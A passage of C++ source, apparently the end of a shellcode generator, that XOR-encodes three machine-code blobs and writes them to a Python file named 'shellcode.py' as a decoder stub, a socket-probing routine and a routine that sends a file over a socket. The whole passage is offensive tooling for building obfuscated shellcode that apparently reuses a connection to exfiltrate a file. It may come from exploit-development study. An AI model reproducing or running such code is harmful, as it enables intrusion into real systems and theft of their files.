
```
if(j>=dwFunct2Size)
  break;
}
ofstream of;
char str[256];
unsigned char byteval;
of.open("shellcode.py");
sprintf(str,"#=======size %d===decode====\\n",dwFunct3Size);
of<<str;
for(i=0;i<dwFunct3Size;i++)
{
    byteval=pencode[i];
    switch(byteval)
    {
    case 0x22:
      byteval=12+dwFunct3Size;
      break;
    case 0xbb:
      byteval=xorvalue;
      break;
    case 0x77:
      byteval=dwFunct2Size+dwFunct1Size;
      break;
    }
    if(i==0)
      sprintf(str,"decode_func=chr(0x%02x)\\n",byteval);
    else
      sprintf(str,"decode_func+=chr(0x%02x)\\n",byteval);
    of<<str;
}
sprintf(str,"#=======size %d===probe_socket====\\n",dwFunct1Size);
of<<str;
for(i=0;i<dwFunct1Size;i++)
{
    if(i==0)
      sprintf(str,"probe_socket_func=chr(0x%02x)\\n",pbuf[i]^xorvalue);
    else
      sprintf(str,"probe_socket_func+=chr(0x%02x)\\n",pbuf[i]^xorvalue);
    of<<str;
}
sprintf(str,"#=======size %d===sent_file_by_socket====\\n",dwFunct2Size);
of<<str;
for(i=0;i<dwFunct2Size-1;i++)
{
    if(i==0)
      sprintf(str,"sent_file_by_socket_func=chr(0x%02x)\\n",pbuf2[i]^xorvalue);
    else
      sprintf(str,"sent_file_by_socket_func+=chr(0x%02x)\\n",pbuf2[i]^xorvalue);
    of<<str;
}
sprintf(str,"sent_file_by_socket_func+=chr(0x%02x)\\n",pbuf2[i]);
of<<str;
sprintf(str,"xorvalue=0x%02x\\n",xorvalue);
of<<str;
sprintf(str,"probe_socket_func_len=0x%02x\\n",dwFunct1Size);
of<<str;
sprintf(str,"sent_file_by_socket_func_len=0x%02x\\n",dwFunct2Size);
of<<str;
of.close();
return 0;
}
```
